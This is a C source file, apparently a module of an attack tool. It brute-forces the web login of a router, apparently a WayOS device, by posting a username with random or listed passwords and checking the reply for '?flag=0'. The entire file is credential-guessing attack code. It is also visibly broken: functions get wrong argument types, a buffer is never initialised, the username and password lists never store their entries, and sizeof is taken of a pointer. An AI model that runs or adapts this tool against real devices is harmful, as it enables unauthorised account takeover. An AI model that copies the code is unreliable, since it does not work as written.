#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/time.h>
//#include <time.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

#include "../main.h"
#include "guess_username_password.h"
#include "../core/debug.h"

static int GetRandomPassword(char *rebuf, const pInput process_result)
{
    /*
     * Generate the random password and return
     */

    char str[MAX_PASSWORD_LENGTH];
    int random_number_0;
    int random_number_1;
    int max = MAX_PASSWORD_LENGTH;
    int seed = process_result->seed;

    random_number_0 = 1 + (int)(rand() % ((int)max - 1));

    if (seed > 1024)
    {
        seed = 0;
    }
    // srand is here
    srand((int)time(0) + seed);

    int i;
    for (i = 0; i < random_number_0; i++)
    {
        // [a, b] random interger
        // [33, 126] except space[32]
        // 92 = 126 - 33 - 1
        random_number_1 = 33 + (int)(rand() % 92);
        if (isprint(random_number_1))
        {
            //printf("%d\n", rand_number);
            //printf("%c\n", rand_number);
            strcat(str, random_number_1);
            //printf("%s\n", lstring);
        }
    }
    //printf("%s\n", lstring);
    strncpy(rebuf, str, MAX_PASSWORD_LENGTH);
    return 0;
}

static int ProcessURL(const char *url, char *host, char *file, int *port)
{
    /*
     * This function will split the url
     * Example with url = 'http://192.168.20.1:8080/index.html'
     * After parse:
     *    host = "192.168.20.1"
     *    file = "index.html"
     *    port = 8080
     */
    char *ptr1, *ptr2;
    int len = 0;
    if (!url || !host || !file || !port)
    {
        return -1;
    }

    ptr1 = (char *)url;

    if (strncmp(ptr1, "http://", strlen("http://")) == 0)
    {
        // Backware offset
        ptr1 += strlen("http://");
    }
    else
    {
        return -1;
    }

    // Search the characters '/'
    ptr2 = strchr(ptr1, '/');

    // If not found '/'
    // strchr return null
    // Else return point
    if (ptr2)
    {
        // Execute here mean program found the '/'
        // Now ptr1 and ptr2 status is here:
        //       ptr1             ptr2
        //        |                |
        // http://192.168.20.1:8080/index.html
        // len is same as the strlen("192.168.20.1")
        len = strlen(ptr1) - strlen(ptr2);

        // Only copy the IP(192.168.20.1:8080) address to host
        memcpy(host, ptr1, len);

        // Make the position backward the '192.168.20.1:8080' become '\0'
        host[len] = '\0';

        // There sentence is judge the (index.html) is existed or not
        if (*(ptr2 + 1))
        {
            // Copy the 'index.html' to file except the frist character '\'
            memcpy(file, ptr2 + 1, strlen(ptr2) - 1);
            // Fill in the last blank with '\0'
            file[strlen(ptr2) - 1] = '\0';
        }
    }
    else
    {
        // If not existed the '/index.html' string
        // Just copy the ptr1 to host
        memcpy(host, ptr1, strlen(ptr1));
        // Also fill in the last character with '\0'
        host[strlen(ptr1)] = '\0';
    }

    // Now split host and ip
    ptr1 = strchr(host, ':');
    if (ptr1)
    {
        /* Now ptr1 status:
         *            ptr1
         *             |
         * 192.168.20.1:8080
         * -----------------
         * Some important C skill:
         * 'pstr++' is not same as '++ptr1'
         * '*ptr1++ = '\0' excute step:
         * 1. ptr1 = '\0';
         * 2. ptr1 += 1;
         */
        *ptr1++ = '\0';
        // Make the port point to (int)8080
        *port = atoi(ptr1);
    }
    else
    {
        *port = POST_DEFAULT;
    }
    return 0;
}

static int HttpTcpClientCreate(const char *host, int port)
{
    struct hostent *he;
    struct sockaddr_in server_addr;
    int socket_fd;
    // 2017-11-03 add timeout
    /*
    struct timeval timeout;
    */
    int ret;

    if ((he = gethostbyname(host)) == NULL)
    {
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr = *((struct in_addr *)he->h_addr);

    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    //if ((socket_fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: init socket failed");
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    ret = setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len);
    if (ret != 0)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: set ret 1 failed");
        return 1;
    }

    int sendbuf = (int)BUFFER_SIZE;

    ret = setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    if (ret != 0)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: set ret 2 failed");
        return 1;
    }

    if (connect(socket_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: connect host failed");
        return 1;
    }

    return socket_fd;
}

static int HttpTcpClientSend(int socket, char *buff, int size)
{
    /*
     * In this function
     * 'socket' is the socket object to host
     * 'buff' is we want to sending to host string 
     * 'size' is sizeof(buff)
     */
    int sent = 0, tmpres = 0;

    // If the buff not null
    while (size > sent)
    {
        // TODO:
        // Make sure the program had sending all data
        // send(sockfd, buf, len, flags);
        tmpres = send(socket, buff + sent, size - sent, 0);
        if (tmpres == -1)
        {
            printf("Send failed\n");
            return -1;
        }
        sent += tmpres;
    }
    // function will return the sizeof send data bytes
    return sent;
}

static int HttpTcpClientRecv(int socket, char *lpbuff)
{
    /*
     * This function will return the receive string length
     */
    int recvnum = 0;
    //recvnum = recv(socket, lpbuff, BUFFER_SIZE * 4, 0);
    recvnum = recv(socket, lpbuff, BUFFER_SIZE * 4, 0);
    return recvnum;
}

static int CheckResult(const char *lpbuf, char *rebuf, int debug_mode)
{
    /*
     * This function will extract the response's transport data from server
     * If we found the 'flag=0'(mean uncorrect password or username) in data:
     *    Return 1;
     * Other program error:
     *    return -1;
     * If we have the RIGHT password and username(we will not found the 'flag=0' in data):
     *    return 0;
     */

    char *ptmp;
    char *response;
    ptmp = (char *)strstr(lpbuf, "HTTP/1.1");

    // WayOS not correct username and password also return the HTTP/1.1
    // If we could NOT found this string in response
    // It mean our targets is not rearchable
    if (!ptmp)
    {
        Log(LOG_DEBUG, debug_mode, "Warning: http/1.1 not found in server return data");
        return 1;
    }

    // Backward offset 9 characters will point to http status code
    // Extract ONLY the numbers from the last strings
    if (atoi(ptmp + 9) != 200)
    {
        Log(LOG_INFO, LOG_INFO, "result:\n%s", lpbuf);
        return 1;
    }

    // Discovery transport data in response
    ptmp = (char *)strstr(lpbuf, "\r\n\r\n");
    if (!ptmp)
    {
        Log(LOG_DEBUG, debug_mode, "Response data is NULL");
        return 1;
    }
    response = (char *)malloc((strlen(ptmp) + 1));
    if (!response)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: malloc failed");
        return 1;
    }

    // ptmp point to the response's data
    strcpy(response, ptmp + 4);

    //printf("%lu\n", sizeof(response));
    //printf("%s\n", response);

    if (sizeof(response) > BUFFER_SIZE)
    {
        Log(LOG_ERROR, LOG_ERROR, "ERROR: the response data more than BUFFER_SIZE");
        return 1;
    }
    strcpy(rebuf, response);

    // Original code blow
    //return response;
    free(response);
    return 0;
}

static int HttpTcpClientClose(int socket)
{
    //shutdown(socket, SHUT_RDWR);
    close(socket);
    return 0;
}

static int HttpPostMethod(const pAttarckStruct attack_struct, const pInput process_result, char *rebuf)
{
    int socket_fd;
    int port;
    //int i;
    char lpbuf[MAX_POST_DATA_LENGTH];
    char host_addr[BUFFER_SIZE] = {'\0'};
    char file[BUFFER_SIZE] = {'\0'};
    char response_data[BUFFER_SIZE];
    char return_string[MAX_RETURN_DATA_LENGTH] = {'\0'};

    if (!attack_struct->url || !attack_struct->post_data)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: url or post_str not find");
        return 1;
    }

    if (ProcessURL(attack_struct->url, host_addr, file, &port))
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: ProcessURL failed");
        return 1;
    }
    Log(LOG_DEBUG, process_result->debug_mode, "host_addr: %s\nfile:%s\nport:%d\n", host_addr, file, port);
    socket_fd = HttpTcpClientCreate(host_addr, port);
    if (socket_fd < 0)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: HttpTcpClientCreate failed");
        return 1;
    }

    Log(LOG_DEBUG, process_result->debug_mode, "Send:\n%s\n", lpbuf);
    sprintf(lpbuf, POST, file, host_addr, port, strlen(attack_struct->post_data), attack_struct->post_data);

    /* 
     * it's time to recv from server
     * store the data from server in 'lpbuf'
     * this will wait and recv data and return
     */

    /* send now */
    Log(LOG_DEBUG, process_result->debug_mode, "Start sending data...");
    if (HttpTcpClientSend(socket_fd, lpbuf, strlen(lpbuf)) < 0)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: HttpTcpClientSend failed");
        //http_tcpclient_close(socket_fd);
        //return return_string;
    }

    if (HttpTcpClientRecv(socket_fd, return_string) <= 0)
    {
        Log(LOG_ERROR, LOG_ERROR, "Error: TttpTcpClientRecv failed");
        //http_tcpclient_close(socket_fd);
        //return return_string;
    }
    Log(LOG_DEBUG, process_result->debug_mode, "Recvevicing the data from server...");

    // Return value is '0' mean success
    if (CheckResult(return_string, response_data, process_result->debug_mode) != 0)
    {
        Log(LOG_ERROR, process_result->debug_mode, "Warning: CheckResult not found anything fun");
        //return return_string;
    }
    Log(LOG_DEBUG, process_result->debug_mode, "Start copying the data to buf...");
    strcpy(rebuf, response_data);
    Log(LOG_DEBUG, process_result->debug_mode, "Finish copy...");
    //return response_data;
    //http_tcpclient_close(socket_fd);
    HttpTcpClientClose(socket_fd);
    Log(LOG_DEBUG, process_result->debug_mode, "Finish http work");
    return 0;
}

static int SuccessOrNot(const int debug_mode, const char *inbuf)
{
    /*
     * if we have the wrrong password or username
     * this fucntion will return 1
     * if we have the right password or username
     * this function will return 0
     * 
     * you should edit this function by your self
     */

    char *ptmp = NULL;
    ptmp = (char *)strstr(inbuf, "?flag=0");
    if (!ptmp)
    {
        // Not found the '?flag=0' in response mean successful
        return 0;
    }
    return 1;
}

int Attack_GuessUsernamePassword(const pInput process_result)
{

    /* attack mode guess the http web password */

    Log(LOG_INFO, LOG_INFO, "Load guess attack module...");
    char username[MAX_USERNAME_LENGTH];
    char password[MAX_PASSWORD_LENGTH];
    char ch;
    char rebuf[BUFFER_SIZE];
    pAttarckStruct attack_struct = (pAttarckStruct)malloc(sizeof(AttarckStruct));

    if (strlen(process_result->attack_mode_0_one_username) == 0)
    {
        if (strlen(process_result->attack_mode_0_username_file_path) == 0)
        {
            /* use the defalut usename */
            strncpy(attack_struct->username, USERNAME_DEFAULT, MAX_USERNAME_LENGTH);
            /* only use the one username */
            attack_struct->username_type = 0;
        }
        else
        {
            /* if user give the username.txt */
            FILE *fp = fopen(process_result->attack_mode_0_username_file_path, 'r');
            if (!fp)
            {
                Log(LOG_ERROR, LOG_ERROR, "Error: Can not open the username file");
                return 1;
            }
            /* use the linked list */
            pUsernameList_Header username_list_header = (pUsernameList_Header)malloc(sizeof(UsernameList_Header));
            username_list_header->length = 0;
            username_list_header->next = NULL;
            while (!feof(fp))
            {
                memset(username, 0, MAX_USERNAME_LENGTH);
                ch = fgetc(fp);
                while (ch != '\n' && ch != EOF)
                {
                    strncat(username, ch, MAX_USERNAME_LENGTH);
                    ch = fgetc(fp);
                }
                pUsernameList username_linklist = (pUsernameList)malloc(sizeof(UsernameList));
                username_linklist->next = username_list_header->next;
                username_list_header->next = username_linklist;
                ++(username_list_header->length);
            }
            fclose(fp);
            attack_struct->username_list_header = username_list_header;
            /* use the muli-username-list */
            attack_struct->username_type = 1;
        }
    }
    else
        strncpy(attack_struct->username, process_result->attack_mode_0_one_username, MAX_USERNAME_LENGTH);
    Log(LOG_DEBUG, process_result->debug_mode, "username_type: %d\n", attack_struct->username_type);

    if (strlen(process_result->attack_mode_0_password_file_path) == 0)
    {
        /* use the random password */
        attack_struct->password_type = 0;
    }
    else
    {
        /* use the password file */
        FILE *fp = fopen(process_result->attack_mode_0_password_file_path, 'r');
        if (!fp)
        {
            Log(LOG_INFO, LOG_ERROR, "Error: Can not open the password file");
            return 1;
        }
        /* use the linked list */
        pPasswordList_Header password_list_header = (pPasswordList_Header)malloc(sizeof(PasswordList_Header));
        password_list_header->length = 0;
        password_list_header->next = NULL;
        while (!feof(fp))
        {
            memset(password, 0, MAX_PASSWORD_LENGTH);
            ch = fgetc(fp);
            while (ch != '\n' && ch != EOF)
            {
                strncat(password, ch, MAX_PASSWORD_LENGTH);
                ch = fgetc(fp);
            }
            pPasswordList password_linklist = (pPasswordList)malloc(sizeof(pPasswordList));
            password_linklist->next = password_linklist->next;
            password_list_header->next = password_linklist;
            ++(password_list_header->length);
        }
        fclose(fp);
        attack_struct->password_list_header = password_list_header;
        /* use the muli-username-list */
        attack_struct->password_type = 1;
    }
    Log(LOG_DEBUG, process_result->debug_mode, "password_type: %d\n", attack_struct->password_type);

    char post_data[MAX_POST_DATA_LENGTH];

    /* use the random pasword */
    if (attack_struct->password_type == 0)
    {
        /* use one username */
        if (attack_struct->username_type == 0)
        {
            /* get one random password every time */
            GetRandomPassword(attack_struct->password, process_result);
            sprintf(post_data, POST_DATA, attack_struct->username, attack_struct->password);

            strncpy(attack_struct->url, POST_URL, MAX_URL_LENGTH);
            strncpy(attack_struct->post_data, post_data, MAX_POST_DATA_LENGTH);

            HttpPostMethod(attack_struct, process_result, rebuf);
        }
    }

    Log(LOG_DEBUG, process_result->debug_mode, "Return value: %s", rebuf);

    // Guess the password
    Log(LOG_DEBUG, process_result->debug_mode, "Check success or not...");
    if (SuccessOrNot(process_result->debug_mode, rebuf) == 0)
    {
        Log(LOG_INFO, LOG_INFO, "Found the password");
        Log(LOG_INFO, LOG_INFO, "[%s : %s]", attack_struct->username, attack_struct->password);
        return 1;
    }

    pthread_exit((void *)0);
    return 0;
}